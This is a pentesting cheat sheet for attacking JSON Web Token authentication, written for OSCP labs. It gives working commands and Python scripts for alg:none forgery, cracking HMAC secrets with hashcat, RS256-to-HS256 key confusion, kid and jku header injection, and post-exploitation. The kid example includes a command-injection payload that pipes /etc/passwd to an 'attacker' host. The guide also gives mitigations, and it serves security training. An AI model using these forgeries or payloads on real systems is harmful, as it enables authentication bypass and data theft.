# JWT (JSON Web Tokens)

> JSON Web Tokens are a compact, URL-safe means of representing claims between two parties. They are widely used for stateless authentication and authorization. In web application pentesting, JWT is a high-value target because misconfigurations and implementation flaws can lead to full authentication bypass or privilege escalation.
>
> This file is OSCP-oriented but includes production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

## Table of Contents

1. [Detection](#1-detection)
2. [Structure and Decoding](#2-structure-and-decoding)
3. [Enumeration](#3-enumeration)
4. [Attack Surface Map](#4-attack-surface-map)
5. [Vulnerabilities and Exploitation](#5-vulnerabilities-and-exploitation)
6. [Tooling](#6-tooling)
7. [Post-Exploitation](#7-post-exploitation)
8. [OSCP Notes](#8-oscp-notes)
9. [References](#9-references)

---

## 1. Detection

JWT is present wherever the application uses token-based auth. Detect by:

- "Authorization: Bearer <token>" header on API requests.
- Cookie value starting with "eyJ" (base64url of "{").
- Local Storage / Session Storage entries named "token", "access_token", "id_token", "jwt".
- URL parameters ("?token=eyJ...") - bad practice but common.
- Response headers: "Set-Cookie: session=eyJ...".

### Quick detection (no browser)

```bash
# Check response headers for JWT-like cookie
curl -sI $TARGET/login | grep -i "set-cookie"

# Grep for JWT in an HTTP dump
curl -s $TARGET/ | grep -oE "eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"

# Browser (DevTools): Application > Storage > Local Storage / Cookies
```

Expected output:

```text
Set-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.abc123
```

### Quick reference table

| Signal | Meaning | Next step |
|--------|---------|-----------|
| `eyJ...` in cookie/localStorage | JWT present | Decode, inspect claims |
| `Authorization: Bearer` | JWT in header | Test alg=none, weak HMAC |
| 3 dot-separated base64url parts | Standard JWS | Decode header + payload |
| 5 dot-separated parts | JWE (encrypted) | Check key management |
| `alg` field present | Signed (JWS) | Test signature attacks |
| `alg` field absent | Possibly `none` | Try removing signature |

---

## 2. Structure and Decoding

### JWT format (JWS, 3 parts)

```text
<base64url(header)>.<base64url(payload)>.<base64url(signature)>
```

- **Header:** `{"alg":"HS256","typ":"JWT"}`
- **Payload:** claims - `sub`, `name`, `iat`, `exp`, `admin`, `role`, etc.
- **Signature:** HMAC-SHA256 (`HS256`), RSA (`RS256`), ECDSA (`ES256`), or `none`.

### Decode without tools

```bash
# Split and decode header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d 2>/dev/null; echo

# Split and decode payload (base64url uses -_ instead of +/)
echo "eyJ1c2VyIjoiZ3Vlc3QifQ" | tr '_-' '/+' | base64 -d 2>/dev/null; echo
```

Expected output:

```text
{"alg":"HS256","typ":"JWT"}
{"user":"guest"}
```

### Decode with Python (no dependencies)

```bash
python3 - <<'EOF'
import base64, json, sys
tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.abc123"
def dec(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)
parts = tok.split(".")
print("HEADER :", json.loads(dec(parts[0])))
print("PAYLOAD:", json.loads(dec(parts[1])))
EOF
```

### Decode with jwt_tool (recommended)

```bash
python3 jwt_tool.py <token>
```

Expected output:

```text
=====================
Decoded Token Values:
=====================
Token header values:
[+] alg = HS256
[+] typ = JWT
Token payload values:
[+] user = guest
[+] iat  = 1700000000
```

### [PROD] Safe decoding

Decoding is passive - no requests to the target. Safe in production.

---

## 3. Enumeration

### What to look for

1. **Algorithm** in header: `HS256`, `RS256`, `none`, `ES256`, `PS256`.
2. **Claim names:** `admin`, `role`, `is_admin`, `user`, `sub`, `groups`, `scope`.
3. **Expiration:** `exp`, `nbf`, `iat` - expired tokens may still be accepted.
4. **Issuer/audience:** `iss`, `aud` - check if validated.
5. **Key ID:** `kid` - path traversal, SQLi, command injection vectors.
6. **JWK/JKU:** `jwk`, `jku` headers - SSRF, key injection.
7. **Signature presence:** trailing dot with empty signature = `alg=none` candidate.

### Enumerate claims

```bash
python3 jwt_tool.py <token> -T
```

This runs a tamper scan - tries `alg=none`, weak keys, claim modifications. [LAB] only.

### Discovery endpoints

- `/.well-known/jwks.json` - public key for RS256.
- `/.well-known/openid-configuration` - OIDC discovery.
- `/oauth/token`, `/api/auth`, `/login` - token issuance.
- `/api/*` - enumerate endpoints with and without token.

### [PROD] Rate-limited enumeration

```bash
for path in /.well-known/jwks.json /.well-known/openid-configuration /api/auth; do
  echo "== $path =="
  curl -s -o /dev/null -w "%{http_code}\n" "$TARGET$path"
  sleep 1
done
```

---

## 4. Attack Surface Map

| Attack | Condition | Impact |
|--------|-----------|--------|
| `alg: none` | Server accepts unsigned tokens | Auth bypass |
| HMAC weak key | HS256 with guessable secret | Forge any token |
| RS256 -> HS256 confusion | Server uses public key as HMAC secret | Forge any token |
| `kid` path traversal | `kid` used to load key file | Read arbitrary file / use known key |
| `kid` SQLi | `kid` used in SQL query | Extract key / bypass |
| `jwk` header injection | Server trusts embedded JWK | Forge token with attacker key |
| `jku` header injection | Server fetches JWK from URL | SSRF + forge token |
| Claim tampering | No signature verification | Privilege escalation |
| Expired token accepted | No `exp` check | Reuse leaked tokens |
| Cross-service confusion | Same key across services | Lateral movement |

---

## 5. Vulnerabilities and Exploitation

### 5.1 alg: none (improper signature verification)

**Root cause:** The server trusts the `alg` field from the token header instead of enforcing a fixed algorithm. If `alg: none` is accepted, no signature is verified.

**Steps:**

1. Decode the token, note the payload (e.g. `{"user":"guest"}`).
2. Change `alg` to `none` (or `None`, `NONE`, `nOnE` - some libs are case-sensitive).
3. Modify payload (e.g. `{"user":"admin"}`).
4. Re-encode header + payload, drop signature (keep trailing dot).

```bash
# Manual: header {"alg":"none","typ":"JWT"} + payload {"user":"admin"} + empty sig
HEADER="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
PAYLOAD="eyJ1c2VyIjoiYWRtaW4ifQ"
TOKEN="$HEADER.$PAYLOAD."
curl -s -H "Authorization: Bearer $TOKEN" $TARGET/admin
```

With jwt_tool:

```bash
python3 jwt_tool.py <token> -X a
```

Expected output:

```text
[+] alg:none exploit successful
[+] Received 200 OK on /admin
```

> [!IMPORTANT]
> OSCP report: screenshot the modified token (header + payload) and the successful admin response with timestamp. This is the proof of auth bypass.

**Mitigation:** server MUST hardcode the expected algorithm. Reject `alg: none` always.

---

### 5.2 Weak HMAC secret (HS256)

**Root cause:** HS256 uses a shared secret. If the secret is short, common, or leaked, an attacker can forge any token.

**Steps:**

1. Obtain a valid JWT.
2. Crack the secret offline with hashcat or john.

```bash
# Save token to file
echo "<token>" > jwt.txt

# hashcat mode 16500 = JWT
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```

Expected output:

```text
<token>:secret123
```

3. Forge a new token with the cracked secret:

```bash
python3 jwt_tool.py <token> -T -S hs256 -p "secret123" -pc user -pv admin
```

Or with a one-liner:

```bash
python3 - <<'EOF'
import jwt
print(jwt.encode({"user":"admin","iat":1700000000}, "secret123", algorithm="HS256"))
EOF
```

> [!IMPORTANT]
> OSCP report: screenshot the hashcat crack result and the forged token used to access a privileged endpoint.

**Mitigation:** use a long random secret (>= 256 bits), rotate regularly, never reuse across services.

---

### 5.3 RS256 -> HS256 algorithm confusion

**Root cause:** The server uses RS256 (asymmetric). If the library accepts `HS256` for the same token, it uses the public key as the HMAC secret. Since the public key is public, an attacker can sign forged tokens.

**Steps:**

1. Obtain the public key:

```bash
curl -s $TARGET/.well-known/jwks.json | jq -r '.keys[0]'
# Or from the cert: openssl s_client -connect $TARGET:443 | openssl x509 -pubkey -noout
```

2. Save as `pub.pem`.

3. Sign a new token with HS256 using `pub.pem` as the secret:

```bash
python3 jwt_tool.py <token> -X k -pk pub.pem
```

Or manually:

```bash
python3 - <<'EOF'
import jwt
pub = open("pub.pem","rb").read()
print(jwt.encode({"user":"admin"}, pub, algorithm="HS256"))
EOF
```

Expected output:

```text
[+] RS256 -> HS256 confusion successful
[+] New token: eyJhbGciOiJIUzI1NiIs...
```

> [!IMPORTANT]
> OSCP report: screenshot the public key retrieval, the forged token generation, and the privileged response.

**Mitigation:** pin the algorithm server-side; never accept the `alg` from the token.

---

### 5.4 kid header injection

The `kid` (Key ID) header tells the server which key to use. If it's used unsafely:

**Path traversal:**

```json
{"alg":"HS256","kid":"../../../../dev/null"}
```

Then sign the token with an empty string. Some servers use `/dev/null` as the key file, HMAC-key = empty.

```bash
python3 jwt_tool.py <token> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
```

**SQL injection:**

```json
{"alg":"HS256","kid":"key1' UNION SELECT 'attackerkey'-- -"}
```

If the server looks up the key in SQL, the attacker controls the HMAC secret.

**Command injection:**

```json
{"alg":"HS256","kid":"key1|curl http://attacker/$(cat /etc/passwd)"}
```

> [!IMPORTANT]
> OSCP report: screenshot the `kid` header payload and the resulting behavior (e.g. arbitrary file read or admin access).

**Mitigation:** treat `kid` as an opaque identifier; validate against a whitelist.

---

### 5.5 jwk / jku header injection

**jwk (embedded key):** some libraries trust the `jwk` header and use the embedded public key to verify. Attacker embeds their own key.

```json
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

**jku (JWK Set URL):** the server fetches the JWK Set from an attacker-controlled URL.

```json
{"alg":"RS256","jku":"http://attacker/jwks.json"}
```

Steps:

1. Host a JWKS on attacker infrastructure.
2. Embed `jku` in the token header.
3. Sign with the matching private key.

```bash
python3 jwt_tool.py <token> -X s -ju "http://attacker/jwks.json"
```

> [!IMPORTANT]
> OSCP report: screenshot the attacker JWKS URL, the token with `jku`, and the privileged response.

**Mitigation:** whitelist `jku` hosts; never trust `jwk` from the token.

---

### 5.6 Claim tampering (no signature verification)

Some applications extract claims without verifying the signature. Change `admin: false` -> `admin: true` and reuse the token.

```bash
python3 - <<'EOF'
import base64, json
def b64(d): return base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode()
h = b64({"alg":"HS256","typ":"JWT"})
p = b64({"user":"admin","admin":True})
print(f"{h}.{p}.AAAA")
EOF
```

Test the modified token. If it works, the server does not verify.

**Mitigation:** ALWAYS verify signature; use a maintained library with secure defaults.

---

### 5.7 Expired / nbf bypass

If `exp` is checked client-side only, expired tokens still work. Test:

```bash
# Reuse an old token after expiry; check response
curl -s -H "Authorization: Bearer <expired_token>" $TARGET/api/me
```

Also check `nbf` (not before) - some servers forget to enforce it.

---

### 5.8 Cross-service JWT confusion

If the same signing key is shared across microservices, a token issued for one service may be accepted by another with different permissions. Map the services, then test token reuse.

```bash
for svc in api admin internal; do
  echo "== $svc =="
  curl -s -H "Authorization: Bearer <token_for_service_a>" "http://$svc.local/api/me"
done
```

---

## 6. Tooling

### jwt_tool

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool && pip install -r requirements.txt
python3 jwt_tool.py <token>
```

Common flags:

| Flag | Purpose |
|------|---------|
| `-T` | Tamper scan (all algorithms) |
| `-X a` | `alg: none` exploit |
| `-X k -pk pub.pem` | RS256 -> HS256 confusion |
| `-C -d dict.txt` | Crack HMAC secret |
| `-I -hc kid -hv <val>` | Inject `kid` header |
| `-S hs256 -p <secret>` | Sign with HMAC secret |
| `-pc <claim> -pv <value>` | Set claim to value |

### hashcat (JWT mode)

```bash
hashcat -m 16500 -a 0 jwt.txt rockyou.txt
```

### john

```bash
john --format=HMAC-SHA256 jwt.txt
```

### jwt.io (web)

Online decoder. **Do NOT paste production tokens** - they may be logged.

### Custom Python with PyJWT

```bash
pip install pyjwt
python3 - <<'EOF'
import jwt
print(jwt.encode({"user":"admin"}, "secret", algorithm="HS256"))
EOF
```

---

## 7. Post-Exploitation

Once an admin/privileged JWT is forged:

1. **Enumerate admin endpoints:** `/admin`, `/api/users`, `/api/settings`, `/internal`.
2. **Extract user lists:** `GET /api/users` often returns PII (emails, roles).
3. **Persist access:** if the app issues long-lived refresh tokens, capture them.
4. **Pivot to other services:** reuse the token against sibling services (see 5.8).
5. **Check for API key exposure:** admin endpoints often leak secrets.
6. **Log analysis:** some apps log full tokens; check debug endpoints or log files.

```bash
# Enumerate admin API
for ep in /api/users /api/settings /admin /internal/status; do
  echo "== $ep =="
  curl -s -H "Authorization: Bearer <forged_token>" "$TARGET$ep" | head -c 300
  echo
done
```

---

## 8. OSCP Notes

> [!IMPORTANT]
> OSCP report evidence for JWT attacks:
> - Screenshot the decoded token (header + payload) BEFORE tampering.
> - Screenshot the modified token (header + payload) AFTER tampering.
> - Screenshot the request (curl or Burp) with the modified token.
> - Screenshot the response proving unauthorized access (200 OK on privileged endpoint).
> - Include timestamps in every screenshot.

> [!IMPORTANT]
> If the exploit uses a crafted token, paste the FULL token in the report appendix (or attach the script that generated it). Screenshots alone may be insufficient.

> [!IMPORTANT]
> For `alg: none` and HMAC-weak-key attacks, run the forged token in a separate terminal and capture the raw request/response. Burp Repeater is ideal - save the request as a screenshot.

**Common OSCP pitfalls:**

- Forgetting that `alg` is case-sensitive in some libraries (`None`, `NONE`, `nOnE`).
- The trailing dot after payload (%%.%%) is REQUIRED for `alg: none` - a token with 2 dots only.
- base64url, not base64 - replace `+` with `-`, `/` with `_`, strip `=`.
- jwt_tool requires Python 3.7+; if install fails, use PyJWT directly.
- Some apps rotate keys; a cracked secret may only work on old tokens.

---

## 9. References

- RFC 7519 (JWT) - https://datatracker.ietf.org/doc/html/rfc7519
- RFC 7515 (JWS) - https://datatracker.ietf.org/doc/html/rfc7515
- RFC 7517 (JWK) - https://datatracker.ietf.org/doc/html/rfc7517
- OWASP JWT Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- PortSwigger JWT attacks - https://portswigger.net/web-security/jwt
- jwt_tool - https://github.com/ticarpi/jwt_tool
- hashcat mode 16500 - https://hashcat.net/wiki/doku.php?id=example_hashes
- CVE-2015-9235 (jsonwebtoken alg bypass) - https://nvd.nist.gov/vuln/detail/CVE-2015-9235
- CVE-2016-10555 (jsonwebtoken key confusion) - https://nvd.nist.gov/vuln/detail/CVE-2016-10555
- CVE-2018-0114 (node-jose key confusion) - https://nvd.nist.gov/vuln/detail/CVE-2018-0114
- CVE-2022-21449 (Java ECDSA Psychic Signatures) - https://nvd.nist.gov/vuln/detail/CVE-2022-21449
